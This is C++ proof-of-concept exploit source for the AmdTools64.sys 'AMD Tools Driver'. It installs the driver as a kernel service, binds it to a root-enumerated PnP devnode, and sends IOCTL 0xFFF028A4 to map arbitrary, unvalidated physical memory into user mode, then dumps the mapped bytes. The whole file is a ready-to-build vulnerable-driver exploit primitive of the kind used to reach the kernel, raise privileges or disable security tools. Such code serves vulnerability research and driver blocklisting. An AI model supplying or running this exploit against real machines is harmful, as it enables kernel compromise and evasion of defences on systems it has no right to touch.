// PoC: AmdTools64.sys ("AMD Tools Driver" 1.7.16.219) arbitrary physical
// memory mapping from user mode via IOCTL 0xFFF028A4.
//
// Build (MSVC, x64):
//   cl /EHsc /W4 poc_amdtools64.cpp cfgmgr32.lib
//
// Run (elevated prompt):
//   poc_amdtools64.exe C:\absolute\path\to\AmdTools64.sys
//
// What it does:
//   1. installs the driver as a kernel service;
//   2. creates a root-enumerated PnP devnode bound to the service (the driver
//      is a PnP driver, so its AddDevice runs when the devnode is started);
//   3. opens the device interface exposed by the driver
//      (GUID 1232175B-1C34-41FD-B101-342D47B828AC);
//   4. sends IOCTL 0xFFF028A4 asking the driver to map physical address
//      0x53000000, length 0x200000, into a user-mode virtual address;
//   5. dumps the first 64 bytes of the returned mapping.

#include <windows.h>
#include <cfgmgr32.h>
#include <initguid.h>
#include <iostream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "cfgmgr32.lib")

DEFINE_GUID(
    GUID_AMD_INTERFACE,
    0x1232175B,
    0x1C34,
    0x41FD,
    0xB1,
    0x01,
    0x34,
    0x2D,
    0x47,
    0xB8,
    0x28,
    0xAC
);

// Input/output layout expected by IOCTL 0xFFF028A4 (METHOD_BUFFERED).
struct MmapRequest
{
    ULONG64 PhysicalAddress; // +0x00 in:  physical base address (unvalidated)
    ULONG32 Length;          // +0x08 in:  size in bytes (unvalidated)
    ULONG32 Status;          // +0x0C out: driver status code
    PVOID   PoolCtx;         // +0x10 out: driver-side allocation
    PVOID   UserVa;          // +0x18 out: user-mode mapping of the physical memory
    UCHAR   CacheType;       // +0x20 in:  0 = NonCached, 1 = Cached, 2 = WriteCombined
};

static_assert(sizeof(MmapRequest) == 0x28, "unexpected request layout");

int wmain(int argc, wchar_t* argv[])
{
    std::wcout << L"[*] AmdTools64.sys physical memory mapping PoC\n";

    if (argc < 2)
    {
        std::wcout << L"[-] usage: " << argv[0]
                   << L" <absolute path to AmdTools64.sys>\n";
        return 0;
    }

    wchar_t driverPath[MAX_PATH * 2] = {};
    if (!GetFullPathNameW(argv[1], MAX_PATH * 2, driverPath, nullptr))
    {
        std::wcout << L"[-] GetFullPathNameW failed: " << GetLastError() << L"\n";
        return 0;
    }

    const std::wstring serviceName = L"AmdTools64";

    //
    // 1. Install the driver as a kernel service.
    //
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        std::wcout << L"[-] OpenSCManagerW failed: " << GetLastError() << L"\n";
        return 0;
    }

    SC_HANDLE hService = CreateServiceW(
        hSCM,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath,
        nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!hService)
    {
        const std::uint32_t err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
        {
            std::wcout << L"[=] service already exists, continuing\n";
            hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
            if (!hService)
            {
                std::wcout << L"[-] OpenServiceW failed: " << GetLastError() << L"\n";
                CloseServiceHandle(hSCM);
                return 0;
            }
        }
        else
        {
            std::wcout << L"[-] CreateServiceW failed: " << err << L"\n";
            CloseServiceHandle(hSCM);
            return 0;
        }
    }
    std::wcout << L"[+] service ready\n";

    //
    // 2. Create a root-enumerated devnode and bind the service to it, so the
    //    kernel invokes the driver's AddDevice when the devnode is started.
    //
    DEVINST devParent = 0;
    if (CM_Locate_DevNodeW(&devParent, nullptr, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Locate_DevNodeW failed\n";
        return 0;
    }

    DEVINST devInst = 0;
    const wchar_t deviceID[] = L"Root\\AmdTools64\\0000";
    if (CM_Create_DevNodeW(&devInst, const_cast<DEVINSTID_W>(deviceID),
                           devParent, CM_CREATE_DEVNODE_NORMAL) != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Create_DevNodeW failed (may already exist)\n";
    }
    else
    {
        std::wcout << L"[+] devnode created\n";
    }

    const wchar_t hwid[] = L"Root\\AmdTools64";
    if (CM_Add_IDW(devInst, const_cast<DEVINSTID_W>(hwid), CM_ADD_ID_HARDWARE) != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Add_IDW failed\n";
    }

    if (CM_Set_DevNode_Registry_PropertyW(
            devInst,
            CM_DRP_SERVICE,
            (PVOID)serviceName.c_str(),
            (ULONG)((serviceName.size() + 1) * sizeof(wchar_t)),
            0) != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Set_DevNode_Registry_PropertyW failed\n";
    }

    if (CM_Setup_DevNode(devInst, CM_SETUP_DEVNODE_READY) != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Setup_DevNode failed\n";
    }
    else
    {
        std::wcout << L"[+] PnP devnode started, driver loaded\n";
    }

    //
    // 3. Open the device interface created by the driver.
    //
    ULONG bufferSize = 0;
    CONFIGRET cr = CM_Get_Device_Interface_List_SizeW(
        &bufferSize, (LPGUID)&GUID_AMD_INTERFACE, nullptr,
        CM_GET_DEVICE_INTERFACE_LIST_PRESENT);

    if (cr != CR_SUCCESS || bufferSize <= 1)
    {
        std::wcout << L"[-] device interface not found (cr=" << cr << L")\n";
        return 0;
    }

    std::vector<wchar_t> buffer(bufferSize);
    cr = CM_Get_Device_Interface_ListW(
        (LPGUID)&GUID_AMD_INTERFACE, nullptr, buffer.data(), bufferSize,
        CM_GET_DEVICE_INTERFACE_LIST_PRESENT);

    if (cr != CR_SUCCESS)
    {
        std::wcout << L"[-] CM_Get_Device_Interface_ListW failed (cr=" << cr << L")\n";
        return 0;
    }

    std::wcout << L"[+] device interface: " << buffer.data() << L"\n";

    HANDLE hDevice = CreateFileW(
        buffer.data(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        std::wcout << L"[-] CreateFileW failed: " << GetLastError() << L"\n";
        return 0;
    }
    std::wcout << L"[+] handle opened\n";

    //
    // 4. Ask the driver to map physical memory into user mode.
    //
    MmapRequest req = {};
    req.PhysicalAddress = 0x53000000; // arbitrary, unvalidated by the driver
    req.Length = 0x200000;
    req.CacheType = 0;                // MmNonCached

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(
        hDevice,
        0xFFF028A4, // IOCTL handled by the driver, METHOD_BUFFERED
        &req,
        sizeof(req),
        &req,
        sizeof(req),
        &bytesReturned,
        nullptr);

    std::wcout << L"[*] DeviceIoControl: " << ok
               << L", last error: " << GetLastError()
               << L", driver status: 0x" << std::hex << req.Status << std::dec
               << L", user VA: " << req.UserVa << L"\n";

    if (ok && req.Status == 0 && req.UserVa != nullptr)
    {
        //
        // 5. Read physical memory through the returned user-mode mapping.
        //
        const unsigned char* ptr = (const unsigned char*)req.UserVa;

        std::wcout << L"[+] first 64 bytes of physical memory @0x53000000:\n    ";
        for (int i = 0; i < 64; ++i)
        {
            std::wcout << std::hex << std::setw(2) << std::setfill(L'0')
                       << (int)ptr[i] << L' ';
        }
        std::wcout << std::dec << L"\n";
    }
    else
    {
        std::wcout << L"[-] mapping failed\n";
    }

    CloseHandle(hDevice);

    // Best-effort cleanup: stop and delete the service. The devnode under
    // Root\AmdTools64 remains and can be removed in Device Manager.
    SERVICE_STATUS ss = {};
    ControlService(hService, SERVICE_CONTROL_STOP, &ss);
    DeleteService(hService);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}
